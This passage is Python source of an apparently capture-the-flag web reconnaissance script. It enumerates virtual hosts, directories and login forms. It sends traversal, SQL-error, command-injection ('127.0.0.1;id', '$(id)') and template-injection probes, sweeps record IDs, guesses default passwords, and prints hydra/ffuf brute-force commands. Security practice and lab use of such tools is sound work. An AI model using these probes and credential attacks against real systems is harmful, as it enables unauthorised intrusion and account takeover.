#!/usr/bin/env python3
"""recon_web.py - polite web enumeration, used by recon_hunt.sh (can also run alone).

For one web port it checks, at a capped request rate:
  headers, cookies (decodes base64/JWT), TLS names, HTML comments, meta tags, hidden inputs
  well-known files (robots, sitemap, security.txt, .git, .env, backups...)
  virtual hosts, directories and files, directory listings, 401/403/405 pages
  a small spider: links, parameters, JavaScript files (endpoints, secrets, comments)
  light probes on parameters (LFI / SQL error / reflection hints - one request each)
  login forms: username enumeration (case variants!), a few default passwords,
               and ready-to-run ffuf / hydra commands for the full brute force
  HTTP basic auth pages, allowed HTTP methods
Everything that looks like a flag is reported.

  python3 recon_web.py -u http://3.144.177.121/ -o out_dir
  python3 recon_web.py -u http://3.144.177.121/ -d lab.local -o out_dir --rate 10
"""
import argparse, base64, html, json, os, random, re, socket, ssl, string, sys, time
import threading, concurrent.futures as cf
import urllib.error, urllib.parse, urllib.request

UA = "Mozilla/5.0 recon-hunt"
VHOSTS = """www dev development staging stage test testing uat qa demo beta alpha old new legacy
admin administrator login portal auth sso secure internal intranet private secret hidden
api api2 app apps web webmail mail smtp imap pop ftp sftp files file upload uploads download
backup backups bak archive archives db database mysql sql phpmyadmin pma redis cache cdn static
assets media img images git gitlab github jenkins ci build deploy docker k8s monitor monitoring
grafana kibana elastic status health metrics log logs ns ns1 ns2 dns vpn remote rdp ssh shop
store blog forum wiki docs doc help support crm erp hr finance pay payment billing account
accounts user users member members client clients partner partners lab labs training student
students staff teacher library cafe guest office corp company it net home server srv mx mobile
m flag flags ctf challenge vault keys key panel dashboard console manage manager management
""".split()
DIRS = """admin administrator login logout register signup user users account dashboard panel
console manage management portal auth secure private secret secrets hidden internal backup
backups bak old new dev development test testing staging tmp temp cache data db database
sql dump dumps files file upload uploads download downloads docs doc documents archive
archives images img static assets css js includes include inc lib config conf configs settings
api api/v1 v1 v2 graphql server-status server-info phpinfo.php info.php test.php shell.php cmd.php
robots.txt sitemap.xml humans.txt security.txt .well-known/security.txt crossdomain.xml
.git/HEAD .git/config .svn/entries .env .env.bak .htaccess .htpasswd .DS_Store web.config
readme.txt README.md README readme.html notes.txt note.txt todo.txt flag.txt flag flag.php secret.txt
password.txt passwords.txt passwd.txt creds.txt credentials.txt users.txt staff-notes.txt
backup.zip backup.tar.gz backup.sql site.zip www.zip db.sql database.sql dump.sql config.php
config.php.bak config.bak index.php.bak index.php~ index.bak index.html.bak .index.php.swp
.bash_history id_rsa wp-admin wp-login.php wp-content phpmyadmin pma adminer.php cgi-bin
scripts script student students staff employee employees hr finance reports report logs log
debug status console.php upload.php search search.php view view.php page.php download.php
""".split()
INSIDE = "flag.txt flag readme.txt notes.txt index.php.bak backup.zip .htpasswd users.txt secret.txt config.php.bak".split()
USERS = """admin Admin ADMIN administrator Administrator root Root user User guest Guest test Test
demo staff Staff support manager Manager operator sysadmin webadmin dev developer info student
teacher librarian employee john alice bob""".split()
PASSWORDS = "password admin Admin 123456 password123 admin123 letmein welcome".split()
# any name.with.dots ending in letters; junk (file names, CDNs, standards sites) is filtered out below
HOST_RE = re.compile(r"(?<![A-Za-z0-9._/-])((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z][a-z0-9-]{1,23})(?![A-Za-z0-9-]|\.[A-Za-z0-9])", re.I)
NOT_TLD = set("""html htm php asp aspx jsp js css json xml txt md png jpg jpeg gif svg ico webp woff woff2 ttf eot map
min bak old zip gz tar sql log conf cfg ini yml yaml py sh pdf doc docx csv exe dll so lock swp tmp""".split())
NOT_HOST = re.compile(r"(w3\.org|schema\.org|ogp\.me|google|gstatic|googleapis|jquery|cloudflare|bootstrapcdn|jsdelivr|unpkg|"
                      r"fontawesome|fonts\.|github\.com|microsoft|mozilla|apache\.org|nginx\.(org|com)|php\.net|wordpress\.org|example\.com)", re.I)
TWO_PART = set("""co.uk ac.uk gov.uk org.uk com.sg edu.sg gov.sg org.sg net.sg per.sg com.au edu.au net.au org.au gov.au
co.jp ac.jp co.nz ac.nz com.my edu.my gov.my co.in ac.in com.hk edu.hk com.cn edu.cn com.tw co.kr""".split())

def good_host(h):
    h = h.lower().strip(".")
    if h.count(".") < 1 or h.split(".")[-1] in NOT_TLD or NOT_HOST.search(h): return False
    if re.fullmatch(r"[\d.]+", h) or h.split(".")[-1].isdigit(): return False
    return True

def base_domain(h):
    parts = h.lower().split(".")
    if len(parts) >= 3 and ".".join(parts[-2:]) in TWO_PART: return ".".join(parts[-3:])
    return ".".join(parts[-2:])
IDOR_SWEPT = set()   # (site, url/param) already swept for ids
FLAG_RE = re.compile(r"ehCTF\{[^}\s]{1,200}\}|SIT\{[^}\s]{1,200}\}|FLAG\{[^}\s]{1,200}\}|flag\{[^}\s]{1,200}\}|(?<![A-Za-z0-9])[A-Za-z0-9]{32}(?![A-Za-z0-9])")
SQL_ERR = re.compile(r"SQL syntax|mysql_|mysqli|ORA-\d|SQLite|sqlite3|PG::|psql|syntax error at or near|unclosed quotation|ODBC|PDOException", re.I)


def ctx():
    c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE; return c


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None


class Web:
    """All requests go through here: one at a time, rate limited, with a timeout and a hard cap."""
    def __init__(self, base, rate, timeout, cap, workers=5, auth=None, max_time=None):
        self.base = base.rstrip("/"); self.rate = rate; self.timeout = timeout; self.cap = cap
        self.next_slot = 0.0; self.count = 0; self.lock = threading.Lock(); self.workers = max(1, workers)
        self.auth = "Basic " + base64.b64encode(auth.encode()).decode() if auth else None
        self.deadline = time.time() + max_time if max_time else None; self.timed_out = False
        p = urllib.parse.urlparse(self.base); self.host = p.hostname; self.port = p.port; self.scheme = p.scheme
        self.opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx()))

    def many(self, items):
        """Fetch [(path, host), ...] with a few requests in flight; results come back in the same order."""
        with cf.ThreadPoolExecutor(self.workers) as ex:
            return list(ex.map(lambda it: self.req(it[0], host=it[1]), items))

    def full(self, path):
        return path if path.startswith("http") else self.base + (path if path.startswith("/") else "/" + path)

    def req(self, path="/", host=None, method="GET", data=None, headers=None):
        # rate limit shared by all threads: requests start at most `rate` per second in total,
        # several can be waiting for a reply at once (that's what makes it faster, not heavier)
        with self.lock:
            if self.count >= self.cap: return None, {}, b"(request cap reached)"
            if self.deadline and time.time() + self.timeout > self.deadline:
                if not self.timed_out:
                    self.timed_out = True; say("    \033[1;31m[!] time limit reached for this web port - finishing up with what was found\033[0m")
                return None, {}, b"(time limit reached)"
            now = time.time(); start = max(now, self.next_slot)
            self.next_slot = start + 1.0 / self.rate; self.count += 1
        if start > now: time.sleep(start - now)
        h = {"User-Agent": UA}
        if self.auth: h["Authorization"] = self.auth
        if host: h["Host"] = host
        if data is not None and "Content-Type" not in (headers or {}): h["Content-Type"] = "application/x-www-form-urlencoded"
        h.update(headers or {})
        r = urllib.request.Request(self.full(path), data=data, method=method, headers=h)
        try:
            resp = self.opener.open(r, timeout=self.timeout)
            return resp.status, {k.title(): v for k, v in resp.headers.items()}, resp.read(2_000_000)
        except urllib.error.HTTPError as e:
            try: body = e.read(2_000_000)
            except Exception: body = b""
            return e.code, {k.title(): v for k, v in (e.headers or {}).items()}, body
        except Exception as e:
            return None, {}, str(e).encode()


FINDINGS, FLAGS = [], {}
def say(msg=""): print(msg, flush=True)
def note(msg): say("    " + msg); FINDINGS.append(msg)
def title(b):
    m = re.search(rb"<title[^>]*>(.*?)</title>", b, re.I | re.S)
    return html.unescape(m.group(1).decode("latin-1").strip())[:80] if m else ""
def look_for_flags(where, data):
    t = data.decode("latin-1") if isinstance(data, bytes) else data
    for m in FLAG_RE.findall(t):
        if len(m) == 32 and not (re.search(r"[A-Z]", m) and re.search(r"[a-z]", m) and re.search(r"\d", m)): continue
        if m not in FLAGS:
            FLAGS[m] = where; say(f"    \033[1;32mFLAG? {m}   ({where})\033[0m")
def save(out, name, body):
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:150] or "x"
    with open(os.path.join(out, safe), "wb") as f: f.write(body)
def b64try(s):
    try:
        t = s + "=" * (-len(s) % 4)
        d = base64.urlsafe_b64decode(t) if re.search(r"[-_]", s) else base64.b64decode(t)
        d = d.decode("utf-8")
        return d if d.isprintable() and len(d) >= 3 else None
    except Exception: return None


def analyse_page(label, path, st, hd, body, out):
    """Everything that can be read off one response without sending more requests."""
    look_for_flags(f"{label} {path}", body)
    for k, v in hd.items():
        look_for_flags(f"{label} {path} header {k}", v)
        if k.startswith("X-") and k not in ("X-Content-Type-Options", "X-Frame-Options", "X-Xss-Protection", "X-Powered-By"):
            note(f"[{label}] {path} unusual header {k}: {v[:120]}")
    for c in [v for k, v in hd.items() if k == "Set-Cookie"]:
        name, _, val = c.split(";")[0].partition("=")
        note(f"[{label}] cookie {name}={val[:60]}")
        if val.count(".") == 2 and val.startswith("eyJ"):
            parts = [b64try(x) for x in val.split(".")[:2]]
            note(f"[{label}]   JWT header {parts[0]}  payload {parts[1]}  (try alg none / weak secret)")
        else:
            d = b64try(urllib.parse.unquote(val))
            if d: note(f"[{label}]   cookie decodes (base64) to: {d[:120]}  (try editing it, e.g. role/admin)")
        if re.search(r"(admin|role|isadmin|user|auth|logged)", name + val, re.I) and re.search(r"(false|0|user|guest|no)\b", val, re.I):
            note(f"[{label}]   cookie looks tamperable: set it to true/1/admin and reload")
    t = body.decode("latin-1")
    for cmt in re.findall(r"<!--(.*?)-->", t, re.S)[:8]:
        cmt = " ".join(cmt.split())
        if cmt: note(f"[{label}] comment in {path}: {cmt[:160]}")
    for m in re.findall(r'<input[^>]+type=["\']?hidden[^>]*>', t, re.I)[:6]:
        nm = re.search(r'name=["\']?([^"\' >]+)', m); vl = re.search(r'value=["\']?([^"\'>]*)', m)
        note(f"[{label}] hidden input in {path}: {nm.group(1) if nm else '?'} = {vl.group(1)[:80] if vl else ''}")
    for m in re.findall(r'<meta[^>]+(?:name|property)=["\'](?:description|author|generator|keywords)["\'][^>]*>', t, re.I)[:4]:
        note(f"[{label}] meta in {path}: {html.unescape(m)[:140]}")
    for m in re.findall(r"[A-Za-z0-9+/]{24,}={0,2}", t)[:20]:
        d = b64try(m)
        if d and re.search(r"[a-z]{3}", d): note(f"[{label}] base64 in {path}: {m[:40]}... -> {d[:100]}")


def login_analysis(w, label, host, page_text, action, user_f, pw_f, extra_fields, out):
    """Find valid usernames from response differences, try a few passwords, print the full-brute commands."""
    path = action if action.startswith(("/", "http")) else "/" + action
    def post(u, p):
        data = dict(extra_fields); data[user_f] = u; data[pw_f] = p
        return w.req(path, host=host, method="POST", data=urllib.parse.urlencode(data).encode())
    def sig(st, body, u):
        return (st, body.replace(u.encode(), b"<U>").strip()[:200])

    junk_u = "zz" + "".join(random.choices(string.ascii_lowercase, k=8))
    st0, _, b0 = post(junk_u, "zz_wrong_pw")
    base = sig(st0, b0, junk_u)
    note(f"[{label}] login {path}: unknown user + wrong password -> HTTP {st0}, {len(b0)} bytes: {b0[:60]!r}")
    if any(f in extra_fields for f in extra_fields if re.search(r"csrf|token|nonce", f, re.I)):
        note(f"[{label}]   form has a CSRF/token field; ffuf/hydra may need a fresh token each request")

    # usernames: defaults with case variants, plus names/emails seen on the site
    seen_names = set(re.findall(r"([A-Za-z0-9._-]+)@[A-Za-z0-9.-]+\.[a-z]{2,}", page_text))
    seen_names |= set(re.findall(r"(?:user(?:name)?|login|account)\s*[:=]\s*([A-Za-z0-9._-]{3,20})", page_text, re.I))
    cands = list(dict.fromkeys(USERS + sorted(seen_names)))[:60]
    say(f"      checking {len(cands)} usernames (case variants included) for a different response...")
    valid = {}
    for u in cands:
        st, _, b = post(u, "zz_wrong_pw")
        if st is None: continue
        s = sig(st, b, u)
        if s != base:
            valid[u] = (st, b)
            note(f"[{label}]   VALID USERNAME? {u!r}: HTTP {st}, {len(b)} bytes: {b[:60]!r}  (unknown users get HTTP {st0})")
    if not valid:
        note(f"[{label}]   no username stood out (all gave HTTP {st0}); the user list needs to be bigger")

    # a handful of obvious passwords for each valid user (tiny, not a brute force)
    for u, (stv, bv) in list(valid.items())[:3]:
        wrong = sig(stv, bv, u)
        for p in PASSWORDS + [u, u.lower(), u + "123"]:
            st, h, b = post(u, p)
            if st is not None and sig(st, b, u) != wrong:
                note(f"[{label}]   LOGIN WORKS? {u} / {p}: HTTP {st}: {b[:120]!r}")
                save(out, f"{label}_login_{u}.html", b); look_for_flags(f"{label} login {u}", b)
                break

    # commands for the real brute force
    url = f"{w.scheme}://{w.host}{'' if not w.port or w.port in (80, 443) else ':' + str(w.port)}{path}"
    hh = f' -H "Host: {host}"' if host else ""
    extra = "".join(f"&{k}={urllib.parse.quote(v)}" for k, v in extra_fields.items())
    u1 = "-fc " + str(st0) if st0 != 200 else f"-fs {len(b0)}"
    say("      next steps (copy, adjust wordlists):")
    say(f"      1) find usernames:  ffuf -u {url} -X POST{hh} -H 'Content-Type: application/x-www-form-urlencoded' "
        f"-d '{user_f}=FUZZ&{pw_f}=x{extra}' -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -mc all {u1} -rate 50")
    if valid:
        u, (stv, bv) = next(iter(valid.items()))
        u2 = "-fc " + str(stv) if stv != 200 else f"-fs {len(bv)}"
        say(f"      2) password for {u}:  ffuf -u {url} -X POST{hh} -H 'Content-Type: application/x-www-form-urlencoded' "
            f"-d '{user_f}={u}&{pw_f}=FUZZ{extra}' -w /usr/share/wordlists/rockyou.txt -mc all {u2} -t 40")
        fail = re.sub(r"[^A-Za-z ]", "", bv.decode("latin-1"))[:20].strip() or "Invalid"
        hhy = f":H=Host: {host}" if host else ""
        say(f"         hydra:  hydra -l {u} -P /usr/share/wordlists/rockyou.txt -s {w.port or (443 if w.scheme == 'https' else 80)} {w.host} "
            f"{'https' if w.scheme == 'https' else 'http'}-post-form \"{path}:{user_f}=^USER^&{pw_f}=^PASS^{extra}{hhy}:F={fail}\"")
    else:
        say(f"      2) then brute force the password with the valid username, filtering the 'wrong password' response")
    say("      remember: usernames can be case-sensitive (admin vs Admin), and each stage can need a different -fc")


def probe_params(w, label, host, url_path, params, method="GET"):
    """A few harmless requests per parameter. Nothing here changes data:
       LFI (read /etc/passwd), SQL error ('), reflection (XSS), command injection (id),
       template injection ({{7*7}}) and IDOR (neighbouring numeric ids)."""
    def send(q):
        if method == "POST":
            return w.req(url_path, host=host, method="POST", data=urllib.parse.urlencode(q).encode())
        return w.req(url_path + "?" + urllib.parse.urlencode(q, safe="/.:'<>{}$();|"), host=host)
    def show(prm, val):
        return f"{method} {url_path} {prm}={val}" if method == "POST" else f"{url_path}?{prm}={val}"

    base_q = {k: (v if v != "" else "test") for k, v in params.items()}
    st0, _, b0 = send(base_q)
    t0 = b0.decode("latin-1") if st0 is not None else ""
    _, _, bmiss = send({**base_q, **{k: "zzmissing" for k in list(base_q)[:1]}})
    for prm in list(params)[:5]:
        tests = [("lfi", "../../../../../../etc/passwd"), ("sqli", "'"), ("xss", "zzrefl<b>"),
                 ("cmd", "127.0.0.1;id"), ("cmd", "$(id)"), ("ssti", "{{7*7}}zz"), ("ssti", "${7*7}zz")]
        if re.fullmatch(r"\d{1,9}", str(base_q[prm])):
            n = int(base_q[prm]); tests += [("idor", str(n + 1)), ("idor", str(max(n - 1, 0)))]
        for kind, val in tests:
            q = dict(base_q); q[prm] = val
            st, _, b = send(q)
            if st is None: continue
            t = b.decode("latin-1")
            if kind == "lfi" and "root:x:0:0" in t:
                note(f"[{label}] LFI CONFIRMED: {show(prm, '../../../../etc/passwd')}  -> use lfi_hunter.py on this parameter")
            elif kind == "lfi" and re.search(r"failed to open|No such file|include\(|fopen", t, re.I):
                note(f"[{label}] {show(prm, '')} looks like it loads files (error mentions files) -> try lfi_hunter.py")
            elif kind == "sqli" and SQL_ERR.search(t) and not SQL_ERR.search(t0):
                note(f"[{label}] SQL ERROR on {show(prm, chr(39))} -> try ' OR 1=1-- -  or  sqlmap -u '<url>' --batch")
            elif kind == "xss" and "zzrefl<b>" in t:
                note(f"[{label}] {show(prm, '')} is reflected without escaping (XSS)")
            elif kind == "cmd" and re.search(r"uid=\d+\([^)]*\)", t) and not re.search(r"uid=\d+\(", t0):
                note(f"[{label}] COMMAND INJECTION: {show(prm, val)} ran 'id' -> try {val.replace('id', 'ls')}, then cat flag*")
            elif kind == "ssti" and "49zz" in t and "49zz" not in t0:
                note(f"[{label}] TEMPLATE INJECTION: {show(prm, val[:-2])} returned 49 -> look up SSTI payloads for the engine (Jinja2: {{{{config}}}}, {{{{''.__class__}}}})")
            elif kind == "idor" and st == 200 and b.strip() and b != b0 and b != bmiss:
                note(f"[{label}] IDOR? {show(prm, val)} shows a different record ({len(b)} bytes: {b[:60]!r}) -> try other ids, e.g. 0, 1, 100, 1337")
                look_for_flags(f"{label} {show(prm, val)}", b)
        # numeric id: sweep a range so an unlinked record (hidden module, other user...) shows up
        if re.fullmatch(r"\d{1,9}", str(base_q[prm])) and (label, show(prm, "")) not in IDOR_SWEPT:
            IDOR_SWEPT.add((label, show(prm, "")))
            ids = list(range(0, 51)) + [99, 100, 101, 999, 1000, 1001, 1337, 9999]
            bodies = {}
            for i in ids:
                q = dict(base_q); q[prm] = str(i)
                st, _, bb = send(q)
                if st is None or not bb: continue
                bodies.setdefault(bb, []).append(i)
            if bodies:
                common = max(bodies, key=lambda k: len(bodies[k]))     # the usual "not found" answer
                distinct = sorted((v[0], k, v) for k, v in bodies.items() if k != common)
                note(f"[{label}] IDOR sweep {show(prm, '0..50,99..101,999..1001,1337,9999')}: "
                     f"{len(distinct)} different answers (most ids give the same {len(common)}-byte page)")
                for first, bb, idlist in distinct[:15]:
                    txt = re.sub(r"<[^>]+>", " ", bb.decode("latin-1"))
                    txt = " ".join(txt.split())[:110]
                    say(f"      {prm}={','.join(map(str, idlist[:6]))}{'...' if len(idlist) > 6 else ''}: {txt}")
                    look_for_flags(f"{label} {show(prm, first)}", bb)


def basic_auth_analysis(w, label, host, auth_paths, page_text, a):
    """Pop-up (HTTP basic) logins: try a handful of defaults, spot username patterns, print hydra commands."""
    seen = []
    for pth, how in auth_paths:
        if pth in seen: continue
        seen.append(pth)
        scheme = (how.split() or ["Basic"])[0]
        realm = (re.search(r'realm="([^"]*)"', how) or [None, ""])[1]
        note(f"[{label}] HTTP {scheme} AUTH on {pth}  realm={realm!r}  (browser login pop-up)")
    # a few obvious pairs only
    pairs = [("admin", "admin"), ("admin", "password"), ("Admin", "admin"), ("root", "root"), ("guest", "guest"), ("user", "user")]
    for pth in seen[:2]:
        for u, p_ in pairs:
            st, _, b = w.req(pth, host=host, headers={"Authorization": "Basic " + base64.b64encode(f"{u}:{p_}".encode()).decode()})
            if st is not None and st not in (401, 403):
                note(f"[{label}]   BASIC AUTH WORKS? {u}:{p_} on {pth} -> HTTP {st}: {b[:80]!r}")
                look_for_flags(f"{label} {pth} as {u}", b); break
    # usernames that look like word+number (student012, user07, emp1001) -> generate the full range
    pats = {}
    for word, num in re.findall(r"\b([A-Za-z]{3,12})(\d{2,4})\b", page_text):
        if word.lower() in ("http", "https", "www", "html", "utf", "jquery", "version", "the"): continue
        pats.setdefault((word, len(num)), set()).add(num)
    port = w.port or (443 if w.scheme == "https" else 80)
    svc = "https-get" if w.scheme == "https" else "http-get"
    hh = f' -m "{seen[0]}"' if seen else ""
    say(f"      next steps for the login pop-up on {', '.join(seen[:3])}:")
    if pats:
        for (word, width), nums in list(pats.items())[:3]:
            # if every number seen starts with 0 (student007, student042), the range is probably 000-099
            top = 10 ** (width - 1) - 1 if width > 1 and all(n.startswith("0") for n in nums) else 10 ** width - 1
            say(f"      usernames on the site look like {word}{sorted(nums)[0]} -> make the whole range:")
            say(f"        seq -f \"{word}%0{width}g\" 0 {top} > users.txt     # {word}{'0'*width} ... {word}{str(top).zfill(width)}")
    else:
        say("      make a users.txt (names seen on the site, admin, Admin...); if names look like word+number, use seq -f \"student%03g\" 0 99 > users.txt")
    for pth in seen[:2]:
        vh = f" (add '{w.host} {host}' to /etc/hosts first)" if host else ""
        say(f"        hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s {port} -f -t 4 {host or w.host} {svc} {pth}{vh}")
    say("      -f stops at the first hit. If a username is given/known, use -l NAME instead of -L users.txt")
    say(f"      then scan behind the login:  sudo bash recon_hunt.sh -t {w.host} -p {port} -A 'user:password'")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-d", "--domain", action="append", default=[])
    ap.add_argument("-o", "--out", required=True)
    ap.add_argument("--rate", type=float, default=15, help="max requests per second (default 15)")
    ap.add_argument("--timeout", type=float, default=6)
    ap.add_argument("--vhost-list"); ap.add_argument("--dir-list")
    ap.add_argument("--max-requests", type=int, default=8000, help="hard cap per port")
    ap.add_argument("--quick", action="store_true")
    ap.add_argument("--no-login", action="store_true", help="don't send any login attempts")
    ap.add_argument("--workers", type=int, default=5, help="requests waiting for a reply at once (default 5; the rate cap still applies)")
    ap.add_argument("--max-time", type=float, help="seconds allowed for this web port; stops sending requests after that")
    ap.add_argument("--auth", help="user:password for HTTP basic auth, to scan pages behind the login pop-up")
    a = ap.parse_args()
    os.makedirs(a.out, exist_ok=True)
    w = Web(a.url, a.rate, a.timeout, a.max_requests, a.workers, a.auth, a.max_time)
    if a.auth: say(f"    scanning WITH basic auth as {a.auth.split(':')[0]}")

    # ---- 1. default site, methods, TLS ----
    st, hd, body = w.req("/")
    if st is None: say(f"    no web response ({body.decode(errors='ignore')[:80]})"); return
    save(a.out, "index_default.html", body)
    say(f"    HTTP {st}  {len(body)} bytes  Server: {hd.get('Server', '?')}  Title: {title(body)!r}")
    for k in ("Location", "X-Powered-By", "Www-Authenticate"):
        if hd.get(k): say(f"    {k}: {hd[k][:120]}")
    if st == 401 or hd.get("Www-Authenticate"):
        note(f"HTTP auth on / ({hd.get('Www-Authenticate', '')[:40]}) -> hydra -L users.txt -P rockyou.txt {w.host} http-get /")
    analyse_page("(IP)", "/", st, hd, body, a.out)
    so, ho, _ = w.req("/", method="OPTIONS")
    if ho.get("Allow"): note(f"allowed methods: {ho['Allow']}")
    hosts = set(h.lower() for h in a.domain)
    blob = body.decode("latin-1") + " " + " ".join(hd.values())
    if w.scheme == "https":
        try:
            s = socket.create_connection((w.host, w.port or 443), timeout=a.timeout)
            ss = ctx().wrap_socket(s, server_hostname=w.host); der = ss.getpeercert(binary_form=True); ss.close()
            blob += " " + der.decode("latin-1")
        except Exception: pass
    for h in HOST_RE.findall(blob):
        if good_host(h): hosts.add(h.lower().strip("."))
    if hosts: note("hostnames seen: " + ", ".join(sorted(hosts)))
    bases = sorted({base_domain(h) for h in hosts})

    # ---- 2. vhosts ----
    vlist = VHOSTS
    if a.vhost_list and os.path.isfile(a.vhost_list):
        vlist = [l.strip() for l in open(a.vhost_list, errors="ignore") if l.strip() and not l.startswith("#")]
    if a.quick: vlist = vlist[:80]
    sites = {"(IP)": None}
    for dom in bases:
        junk = "zz" + "".join(random.choices(string.ascii_lowercase, k=8)) + "." + dom
        bst, _, bb = w.req("/", host=junk); base = (bst, len(bb))
        say(f"    vhost search *.{dom}: {len(vlist)} names, a fake name gives {bst}/{len(bb)} bytes, ~{len(vlist)/a.rate:.0f}s")
        cands = [c for c in dict.fromkeys([dom] + sorted(h for h in hosts if h.endswith("." + dom)) + [f"{v}.{dom}" for v in vlist]) if c not in sites]
        for cand, (s2, h2, b2) in zip(cands, w.many([("/", c) for c in cands])):
            if s2 is not None and (s2, len(b2)) != base:
                sites[cand] = cand; save(a.out, f"index_{cand}.html", b2)
                note(f"VHOST {cand}: HTTP {s2}, {len(b2)} bytes, title {title(b2)!r}")
                analyse_page(cand, "/", s2, h2, b2, a.out)
        if len(sites) > 1:
            say(f"    to open them in a browser:  echo '{w.host} {' '.join(k for k in sites if k != '(IP)')}' | sudo tee -a /etc/hosts")

    # ---- 3. each site ----
    dlist = DIRS
    if a.dir_list and os.path.isfile(a.dir_list):
        dlist = list(dict.fromkeys(DIRS + [l.strip().lstrip("/") for l in open(a.dir_list, errors="ignore") if l.strip() and not l.startswith("#")]))
    if a.quick: dlist = dlist[:120]
    for label, host in sites.items():
        say(f"    --- site {label}")
        junk = "/zz" + "".join(random.choices(string.ascii_lowercase, k=10))
        bst, _, bb = w.req(junk, host=host); miss = (bst, len(bb))
        if bst == 200: say(f"      note: missing pages return 200 ({len(bb)} bytes), so results are judged by size")

        # 3a. spider: links, params, scripts (depth 2, max 40 pages)
        pages, queue, params, scripts, forms = {}, ["/"], {}, set(), []
        while queue and len(pages) < (15 if a.quick else 40):
            pth = queue.pop(0)
            if pth in pages: continue
            s3, h3, b3 = w.req(pth, host=host)
            if s3 is None: continue
            pages[pth] = b3
            if pth != "/": analyse_page(label, pth, s3, h3, b3, a.out)
            t = b3.decode("latin-1")
            forms += [(pth, f) for f in re.findall(r"<form[^>]*>.*?</form>", t, re.I | re.S)]
            for link in re.findall(r'(?:href|src|action)=["\']([^"\'#]+)', t, re.I):
                u = urllib.parse.urlparse(urllib.parse.urljoin(pth, link))
                if u.netloc and u.netloc.split(":")[0] not in (w.host, host or ""): continue
                if u.path.endswith(".js"): scripts.add(u.path); continue
                if re.search(r"\.(css|png|jpe?g|gif|ico|svg|woff2?|ttf)$", u.path, re.I): continue
                if u.query: params[u.path] = dict(urllib.parse.parse_qsl(u.query, keep_blank_values=True))
                if u.path and u.path not in pages and u.path.count("/") <= 4: queue.append(u.path)
        if len(pages) > 1: note(f"[{label}] spidered {len(pages)} pages: {', '.join(list(pages)[:12])}")
        for pth, q in params.items():
            note(f"[{label}] parameter(s) {pth}?{'&'.join(f'{k}={v}' for k, v in q.items())}")
            if any(re.search(r"page|file|path|doc|include|lang|template|view|dir|folder|load|read", k, re.I) or re.search(r"\.\w{2,4}$", v) for k, v in q.items()):
                note(f"[{label}]   looks like it loads files -> LFI: python3 lfi_hunter.py -u '{w.base}{pth}?{list(q)[0]}=FUZZ' -t <file>")
        for js in sorted(scripts)[:10]:
            s4, _, b4 = w.req(js, host=host)
            if s4 != 200: continue
            save(a.out, f"{label}_{js}", b4); look_for_flags(f"{label} {js}", b4)
            t = b4.decode("latin-1")
            eps = sorted(set(re.findall(r'["\'](/[A-Za-z0-9_./-]{2,60})["\']', t)))[:15]
            if eps: note(f"[{label}] {js} mentions paths: {', '.join(eps)}")
            for m in re.findall(r"(?:pass(?:word)?|secret|token|api[_-]?key|key)\s*[:=]\s*['\"]([^'\"]{3,80})", t, re.I)[:5]:
                note(f"[{label}] {js} has a secret-looking value: {m}")
            for cmt in re.findall(r"/\*(.*?)\*/|//([^\n]{6,120})", t, re.S)[:5]:
                c = " ".join("".join(cmt).split())
                if c and not c.startswith(("!", "#")) and "http" not in c: note(f"[{label}] {js} comment: {c[:120]}")
            for ep in eps[:10]:
                if ep in pages or ep.count("/") > 4 or re.search(r"\.(css|png|jpe?g|gif|svg|ico)$", ep): continue
                s9, h9, b9 = w.req(ep, host=host); pages[ep] = b9
                if s9 is not None and s9 != 404 and (s9, len(b9)) != miss:
                    note(f"[{label}] endpoint from {js}: {ep}  HTTP {s9}  {len(b9)} bytes: {b9[:80]!r}")
                    save(a.out, f"{label}_{ep}", b9); analyse_page(label, ep, s9, h9, b9, a.out)

        # 3b. paths and files
        auth_paths = [("/", hd.get("Www-Authenticate", ""))] if label == "(IP)" and (st == 401 or hd.get("Www-Authenticate")) else []
        say(f"      checking {len(dlist)} paths (a missing page is {bst}/{len(bb)} bytes, ~{len(dlist)/a.rate:.0f}s)")
        found_dirs, robots = [], []
        for pth, (s5, h5, b5) in zip(dlist, w.many([("/" + p_, host) for p_ in dlist])):
            if s5 is None or s5 == 404 or (s5, len(b5)) == miss: continue
            if s5 in (301, 302, 307, 308):
                loc = h5.get("Location", "")
                note(f"[{label}] /{pth} -> {s5} {loc}")
                if loc.rstrip("/").endswith(pth.rstrip("/")): found_dirs.append("/" + pth.rstrip("/") + "/")
                continue
            if s5 == 401: auth_paths.append(("/" + pth, h5.get("Www-Authenticate", "")))
            extra = {401: " (login needed: hydra http-get)", 403: " (forbidden, but it exists: try files inside)",
                     405: " (wrong method: try POST)", 500: " (server error: input may reach code)"}.get(s5, "")
            note(f"[{label}] /{pth}  HTTP {s5}  {len(b5)} bytes{extra}")
            if s5 == 200:
                save(a.out, f"{label}_{pth}", b5); analyse_page(label, "/" + pth, s5, h5, b5, a.out)
                if b"Index of" in b5: found_dirs.append("/" + pth.rstrip("/") + "/")
                if pth.startswith(".git"): note(f"[{label}]   exposed git repo -> git-dumper {w.base}/.git/ repo/  then git log -p")
                if pth == "robots.txt":
                    robots = [m for m in re.findall(r"(?:dis)?allow:\s*(\S+)", b5.decode("latin-1"), re.I) if m != "/"]
                if pth == "sitemap.xml":
                    for loc in re.findall(r"<loc>([^<]+)</loc>", b5.decode("latin-1"))[:20]:
                        lp = urllib.parse.urlparse(loc).path
                        if lp not in pages: robots.append(lp)
            if s5 == 403 and "." not in pth.split("/")[-1]: found_dirs.append("/" + pth.rstrip("/") + "/")
            if s5 == 405:
                s6, _, b6 = w.req("/" + pth, host=host, method="POST", data=b"")
                note(f"[{label}]   POST /{pth} -> HTTP {s6}, {len(b6)} bytes: {b6[:60]!r}")

        # 3c. follow robots/sitemap entries and folders
        done = set()
        for d in (robots + found_dirs)[:25]:
            if d in done: continue
            done.add(d)
            s7, h7, b7 = w.req(d, host=host)
            if s7 is None: continue
            note(f"[{label}] {d}  HTTP {s7}  {len(b7)} bytes")
            if s7 == 401: auth_paths.append((d, h7.get("Www-Authenticate", "")))
